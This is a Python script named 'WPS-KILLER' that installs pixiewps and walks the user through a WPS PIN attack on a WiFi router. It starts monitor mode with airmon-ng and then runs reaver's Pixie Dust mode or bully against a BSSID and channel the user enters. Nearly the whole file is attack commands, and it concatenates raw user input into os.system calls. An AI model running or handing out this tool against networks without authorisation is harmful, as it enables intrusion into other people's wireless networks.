import os
import time
os.system('clear')
print ( '\x1b[2;31;40m' +'''
=========================================================================================
 _     _  _______  _______         ___   _  ___   ___      ___      _______  ______
| | _ | ||       ||       |       |   | | ||   | |   |    |   |    |       ||    _ |
| || || ||    _  ||  _____| ____  |   |_| ||   | |   |    |   |    |    ___||   | ||
|       ||   |_| || |_____ |____| |      _||   | |   |    |   |    |   |___ |   |_||_
|       ||    ___||_____  |       |     |_ |   | |   |___ |   |___ |    ___||    __  |
|   _   ||   |     _____| |       |    _  ||   | |       ||       ||   |___ |   |  | |
|__| |__||___|    |_______|       |___| |_||___| |_______||_______||_______||___|  |_|
github.com/FDX100 
========================================================================================
'''+ '\x1b[0m')
input = raw_input

install = raw_input('do you want install tools (Y)for yes (N)for No ')
if install =='y' or install =='Y':
    os.system('apt-get update')
    os.system('apt-get install build-essential')
    os.system('apt-get install libpcap-dev')
    os.system('apt-get install sqlite3')
    os.system('apt-get install libsqlite3-dev')
    os.system('apt-get install pixiewps')
    os.system('clear')
    print("now You'r Ready")
    time.sleep(2)
    os.system('clear')

try:
    print('\x1b[6;30;42m'+'--------------------------------------------' + '\x1b[0m')
    print('do you want to use pixiewps or Bully')
    print('(1) to pixiewps Attack')
    print('(2) to Bully Attack')
    print('\x1b[6;30;42m'+'--------------------------------------------'+ '\x1b[0m')
    method = raw_input('your choice : ')

    if method =="1":
                iface = raw_input('your default interface is (wlan0) ')
                os.system('airmon-ng start '+iface)
                os.system('clear')
                print('\x1b[1;32;40m'+'now open another terminal and type wash -i '+iface+'mon'+ '\x1b[0m')
                mon = iface+'mon'
                bssid = raw_input("WIFI BSSID :")
                ch = raw_input("WIFI Channel :")
                os.system('reaver -i '+mon+' -b '+bssid+' -c '+ch+' -vvv -K 1 -f')
    if method =="2":
                iface = raw_input('your default interface is (wlan0) ')
                os.system('airmon-ng start '+iface)
                os.system('clear')
                print('\x1b[1;32;40m'+'now open another terminal and type wash -i '+iface+'mon'+ '\x1b[0m')
                mon = iface+'mon'
                bssid = raw_input("WIFI BSSID :")
                ch = raw_input("WIFI Channel :")
                os.system("bully -b "+bssid+" -c "+ch+" -v 3 -l 43 -1 0,1 -B -L "+mon )

except KeyboardInterrupt:
    print("please waite")
    os.system("clear")
finally:
    os.system('airmon-ng stop '+mon)
    time.sleep(2)
    os.system('clear')
    print ("now you'r PC in normal mode")
